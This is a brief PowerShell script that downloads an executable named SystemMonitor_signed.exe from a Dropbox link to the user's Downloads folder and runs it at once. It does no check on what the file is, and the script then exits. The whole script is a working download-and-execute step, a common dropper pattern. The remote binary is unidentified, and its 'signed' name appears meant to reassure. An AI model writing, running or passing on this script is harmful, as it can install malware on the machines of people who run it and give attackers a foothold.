# PowerShell Download and Execute Script
try {
    # Define the download URL and destination
    $url = "www.dropbox.com/scl/fi/orjlsqn2j8e8wta19w866/SystemMonitor_signed.exe?rlkey=in43lzn482c3i23r67ktcna6z&e=1&st=8xqu3zud&dl=1"  # REPLACE WITH YOUR ACTUAL URL
    $destination = "$env:USERPROFILE\Downloads\downloaded_file.exe"  # Downloads folder
    
    # Download the file
    Write-Host "Downloading file..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $url -OutFile $destination
    
    # Verify download was successful
    if (Test-Path $destination) {
        Write-Host "File downloaded successfully to: $destination" -ForegroundColor Green
        
        # Execute the downloaded file
        Write-Host "Starting the application..." -ForegroundColor Yellow
        Start-Process -FilePath $destination -WindowStyle Normal
        
        # Wait a moment then close PowerShell
        Start-Sleep -Seconds 2
        Write-Host "Closing PowerShell..." -ForegroundColor Green
    } else {
        Write-Host "Download failed - file not found" -ForegroundColor Red
    }
} catch {
    Write-Host "An error occurred: $($_.Exception.Message)" -ForegroundColor Red
}

# Exit PowerShell
exit
